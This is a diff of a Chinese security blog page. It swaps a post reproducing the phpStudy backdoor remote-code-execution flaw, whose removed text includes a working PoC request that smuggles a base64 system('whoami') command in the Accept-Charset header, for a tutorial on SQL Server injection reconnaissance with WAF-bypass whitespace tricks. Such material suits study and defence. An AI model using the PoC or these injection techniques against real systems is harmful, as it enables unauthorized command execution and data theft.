@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>phpstudy远程代码执行复现 | WLSMILE Blog</title>
-  <meta name="keywords" content=" 漏洞复现 ">
-  <meta name="description" content="phpstudy远程代码执行复现 | WLSMILE Blog">
+  <title>SQL SERVER 注入（一） | WLSMILE Blog</title>
+  <meta name="keywords" content=" 注入 , sql server ">
+  <meta name="description" content="SQL SERVER 注入（一） | WLSMILE Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="SQL server 的基础知识部分系统库的简介Sqlserver数据库有四个系统数据库，分别是master，model，msdb，tempdb。我们最经常使用到的时master 库，它与 MySQL 中的information_schema 库有几分相似，都存储了所有数据库库名（sysdatabases），表名（sysobjects），字段名（syscolumns）。而我们在注入的过程当中就要用">
 <meta name="keywords" content="注入,sql server">
@@ -332,9 +332,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-2" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-6" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">phpstudy远程代码执行复现</h1>
+        <h1 class="article-title">SQL SERVER 注入（一）</h1>
     
     <div class="article-meta">
         
@@ -342,21 +342,23 @@
         
         <span class="book">
             
-                <a href="javascript:" data-rel="其他">其他</a>
+                <a href="javascript:" data-rel="Web安全">Web安全</a>
             
         </span>
         
         
         <span class="tag">
             
-            <a href="javascript:" class="color5">漏洞复现</a>
+            <a href="javascript:" class="color3">注入</a>
+            
+            <a href="javascript:" class="color1">sql server</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-10-09 08:43:42'>2019-10-08 20:31</time>
+        创建时间:<time class="date" title='更新时间: 2019-10-11 10:40:56'>2019-10-11 10:28</time>
         
     </div>
     <div class="article-meta">
@@ -378,7 +380,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#POC"><span class="toc-text">POC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#POC-1"><span class="toc-text">POC</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#影响范围"><span class="toc-text">影响范围</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-server-的基础知识部分"><span class="toc-text">SQL server 的基础知识部分</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#系统库的简介"><span class="toc-text">系统库的简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三个视图的简单使用（sysdatabases-sysobjects-syscolumns）"><span class="toc-text">三个视图的简单使用（sysdatabases,sysobjects,syscolumns）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#查询所有的数据库名"><span class="toc-text">查询所有的数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查询数据库中所有的表名"><span class="toc-text">查询数据库中所有的表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查询表中所有的列名"><span class="toc-text">查询表中所有的列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查询字段"><span class="toc-text">查询字段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注释符以及各种信息探测"><span class="toc-text">注释符以及各种信息探测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#注释风格"><span class="toc-text">注释风格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#空白格字符（多用来绕过-WAF）"><span class="toc-text">空白格字符（多用来绕过 WAF）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常用运算符号"><span class="toc-text">常用运算符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基础信息探测"><span class="toc-text">基础信息探测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用-top-进行限制查询"><span class="toc-text">利用 top 进行限制查询</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -394,29 +396,120 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>phpstudy是我的第一个环境，也是从大一就开始用到现在的环境，没想到李里面竟然隐藏了三年的木马。免杀三年，细思极恐啊。不过辛亏也只是自己实验用的环境，不是搭的公网的环境。</p>
-<blockquote>
-<p>PhpStudy软件对于国内众多开发者而言，并不陌生。它是一款免费的PHP调试环境的程序集成包，集成了最新的Apache、PHP、MySQL、phpMyAdmin、ZendOptimizer多款软件一次性安装，无需配置即可直接使用，具有PHP环境调试和PHP开发功能。因为免费公益、简易方便，现已发展到一定的规模，有着近百万PHP语言学习者、开发者用户。<br>然而，如此绿色无公害的“国民”开发软件遭到了黑客的毒手，并且犯罪动机竟然出自黑客的技痒和虚荣心。据杭州公安披露，黑客组织早在2016年就编写了“后门”文件，并非法侵入了PhpStudy的官网，篡改了软件安装包植入“后门”。而该“后门”具有控制计算机的功能，可以远程控制下载运行脚本实现用户个人信息收集。<br>从2016年起，黑客利用该“后门”犯罪作恶一发不可收拾，大量中招的电脑沦为“肉鸡”执行危险命令，不计其数的用户账号密码、电脑数据、敏感信息被远程抓取和回传。据统计，黑客已控制了超过67万台电脑，非法获取账号密码类、聊天数据类、设备码类等数据10万余组，而此案也是2019年以来，国内影响最为严重的供应链攻击事件。</p>
-</blockquote>
-<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>紧接着老大发来了POC，所以赶紧复现一波。</p>
-<h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><pre><code>GET /110.php HTTP/1.1
-Host: 192.168.199.186
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.9
-Accept-Encoding:gzip,deflate
-Accept-Charset:c3lzdGVtKCd3aG9hbWknKTs=
-Cookie:UM_distinctid=16ae380e49f27e-0987ab403bca49-3c604504-1fa400-16ae380e4a011b; CNZZDATA3801251=cnzz_eid%3D1063495559-1558595034-%26ntime%3D1559102092; CNZZDATA1670348=cnzz_eid%3D213162126-1559207282-%26ntime%3D1559207282
-Connection: close</code></pre><p><code>c3lzdGVtKCd3aG9hbWknKTs=这是你要执行的命令的base64加密，且请求报文除GET和Host外不能变动</code></p>
-<p>在访问正常已存在的php文件时抓包将POC中的数据替换到burp中发送即可</p>
-<p><img src="/images/2/1.png" alt><br>可以看到可以远程命令执行</p>
-<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>目前影响的版本为2016，2018中的</p>
-<pre><code>php-5.1.17 + Apache
-php-5.4.45 + Apache
-php-5.2.17 + Nginx
-</code></pre>
+        <h1 id="SQL-server-的基础知识部分"><a href="#SQL-server-的基础知识部分" class="headerlink" title="SQL server 的基础知识部分"></a>SQL server 的基础知识部分</h1><h2 id="系统库的简介"><a href="#系统库的简介" class="headerlink" title="系统库的简介"></a>系统库的简介</h2><p>Sqlserver数据库有四个系统数据库，分别是master，model，msdb，tempdb。我<br>们最经常使用到的时master 库，它与 MySQL 中的information_schema 库有几分相似，<br>都存储了所有数据库库名（sysdatabases），表名（sysobjects），字段名（syscolumns）。<br>而我们在注入的过程当中就要用的 master 库中的这三个视图，无论是联合查询注入还是盲<br>注与 DNSlog 注入都离不开这三个视图表。</p>
+<p>系统库简述：</p>
+<table>
+<thead>
+<tr>
+<th>库名</th>
+<th>简述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>master</td>
+<td>用于记录所有 SQL Server 系统级别的信息，这些信息用于控制用户数据库和数据操作。</td>
+</tr>
+<tr>
+<td>model</td>
+<td>SQLServer 为用户数据库提供的样板，新的用户数据库都以 model 数据库为基础</td>
+</tr>
+<tr>
+<td>msdb</td>
+<td>由 Enterprise Manager 和Agent 使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息。</td>
+</tr>
+<tr>
+<td>tempdb</td>
+<td>它为临时表和其他临时工作提供了一个存储区。</td>
+</tr>
+</tbody></table>
+<h2 id="三个视图的简单使用（sysdatabases-sysobjects-syscolumns）"><a href="#三个视图的简单使用（sysdatabases-sysobjects-syscolumns）" class="headerlink" title="三个视图的简单使用（sysdatabases,sysobjects,syscolumns）"></a>三个视图的简单使用（sysdatabases,sysobjects,syscolumns）</h2><h3 id="查询所有的数据库名"><a href="#查询所有的数据库名" class="headerlink" title="查询所有的数据库名"></a>查询所有的数据库名</h3><p><code>select *from master..sysyatabases</code></p>
+<p><img src="/images/6/1.png" alt></p>
+<p>这条语句会显示出数据库的所有信息，其中我们应用到的有name 和 dbid这俩个字段。而我们通常只需要知道名称即可，所以用到了如下语句：</p>
+<p><code>select name from master..sysdatabases</code></p>
+<p><img src="/images/6/2.png" alt></p>
+<h3 id="查询数据库中所有的表名"><a href="#查询数据库中所有的表名" class="headerlink" title="查询数据库中所有的表名"></a>查询数据库中所有的表名</h3><p><code>select name from master..sysobjects where Xtypee = &#39;x&#39;</code></p>
+<p><img src="/images/6/3.png" alt></p>
+<h3 id="查询表中所有的列名"><a href="#查询表中所有的列名" class="headerlink" title="查询表中所有的列名"></a>查询表中所有的列名</h3><p><code>select * from databases..table</code></p>
+<p>例如：select * from test..test</p>
+<p><img src="/images/6/4.png" alt></p>
+<h3 id="查询字段"><a href="#查询字段" class="headerlink" title="查询字段"></a>查询字段</h3><p><code>select * from test..syscolumns where xtype=167</code></p>
+<p><img src="/images/6/5.png" alt></p>
+<p>Tip:在对 sysobjects 和 syscolumns 使用的时候我们需要增加一个 xtype 作为限制条件，<br>而在两个视图当中也都有着不同的含义。具体参照：</p>
+<p><a href="https://www.cnblogs.com/zhaomengmeng/p/4933828.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaomengmeng/p/4933828.html</a></p>
+<h2 id="注释符以及各种信息探测"><a href="#注释符以及各种信息探测" class="headerlink" title="注释符以及各种信息探测"></a>注释符以及各种信息探测</h2><h3 id="注释风格"><a href="#注释风格" class="headerlink" title="注释风格"></a>注释风格</h3><pre><code>/*
+-- 常用
+;%00
+</code></pre><h3 id="空白格字符（多用来绕过-WAF）"><a href="#空白格字符（多用来绕过-WAF）" class="headerlink" title="空白格字符（多用来绕过 WAF）"></a>空白格字符（多用来绕过 WAF）</h3><pre><code>01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,1415,16,17,18,19,1A,1B,1
+C,1D,1E,1F,20
+/**/
+</code></pre><h3 id="常用运算符号"><a href="#常用运算符号" class="headerlink" title="常用运算符号"></a>常用运算符号</h3><table>
+<thead>
+<tr>
+<th align="center">+</th>
+<th align="left">加法运算</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">-</td>
+<td align="left">减法运算</td>
+</tr>
+<tr>
+<td align="center">*</td>
+<td align="left">乘法运算</td>
+</tr>
+<tr>
+<td align="center">/</td>
+<td align="left">除法运算</td>
+</tr>
+<tr>
+<td align="center">&amp;</td>
+<td align="left">位与逻辑运算，从两个表达式中取对应的位。当且仅当输入表达式中两个位的值都为 1 时，结果中的位才被设置为 1，否则，结果中的位被设置为 0</td>
+</tr>
+<tr>
+<td align="center">|</td>
+<td align="left">位或逻辑运算，从两个表达式中取对应的位。如果输入表达式中两个位只要有一个的值 1 时，结果的位就被设置为 1，只有当两个位的值都为 0 时，结果中的位才被设置为 0</td>
+</tr>
+<tr>
+<td align="center">^</td>
+<td align="left">位异或运算，从两个表达式中取对应的位。如果输入表达式中两个位只有一个的值为 1 时，结果中的位就被设置为 1；只有当两个位的值都为 0 或 1 时，结果中的位才被设置为 0</td>
+</tr>
+</tbody></table>
+<h3 id="基础信息探测"><a href="#基础信息探测" class="headerlink" title="基础信息探测"></a>基础信息探测</h3><pre><code>@@VERSION,@@SERVERNAME,@@SERVICENAME; 
+--Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) 
+--WIN-2008
+--MSSQLSERVER
+
+USER,CURRENT_USER,SESSION_USER,SYSTEM_USER; 
+--dbo
+--dbo
+--dbo
+--sa
+
+USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME(); 
+--dbo
+--wyb
+--46530
+--sa
+
+USER_ID(),USER_SID(); 
+--1
+--&lt;01&gt;
+ORIGINAL_LOGIN(); 
+--sa
+</code></pre><h2 id="利用-top-进行限制查询"><a href="#利用-top-进行限制查询" class="headerlink" title="利用 top 进行限制查询"></a>利用 top 进行限制查询</h2><p>在 mysql 注入中我们会遇到一行不能够显示多列的情况，解决的方法是利用 limit m,n 进行<br>控制，将数据逐行输出。而在 SQL server 中也有这样的情况（尤其是利用 DNSlog 注入时），<br>我们就可以用如下两种方法做到与 limit m,n 同样的效果</p>
+<p>(1)在查询数据库名称时利用 dbid 进行限制查询</p>
+<p>由于 dbid 是系统数据库所特有的，所有可以依次从 1 到 n 注出所有的数据库名</p>
+<p><img src="/images/6/6.png" alt></p>
+<p>(2)在查询表和字段时利用 top 语法进行查询</p>
+<p>在 sysobjects 和 syscolumns 视图当拥有大量的数据，如果依据 id 值进行限制会非常的繁<br>琐，浪费时间。所以可以用到如下 sql 查询语法：</p>
+<p>取第 m 条到第 n 条记录</p>
+<pre><code>select top (n-m+1) id from tablename
+where id not in (
+    select top m-1 id from tablename
+)</code></pre><p>具体利用：</p>
+<p><img src="/images/6/7.png" alt></p>
+<p>这样我们在 DNSlog 注入时才能拼接完整的 payload。要学习新的sql注入，就要从基本的sql语句开始。</p>
+
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1102528985@qq.com </span>
     </div>
@@ -425,12 +518,12 @@ php-5.2.17 + Nginx
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>phpstudy远程代码执行复现</p>
+    <p><span class="copy-title">文章标题:</span>SQL SERVER 注入（一）</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="WLSMILE">WLSMILE</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-10-08, 20:31:10</p>
-    <p><span class="copy-title">最后更新:</span>2019-10-09, 08:43:42</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/10/08/2/" title="phpstudy远程代码执行复现">https://luckdogiii.github.io/2019/10/08/2/</a>
+    <p><span class="copy-title">发布时间:</span>2019-10-11, 10:28:47</p>
+    <p><span class="copy-title">最后更新:</span>2019-10-11, 10:40:56</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/10/11/6/" title="SQL SERVER 注入（一）">https://luckdogiii.github.io/2019/10/11/6/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
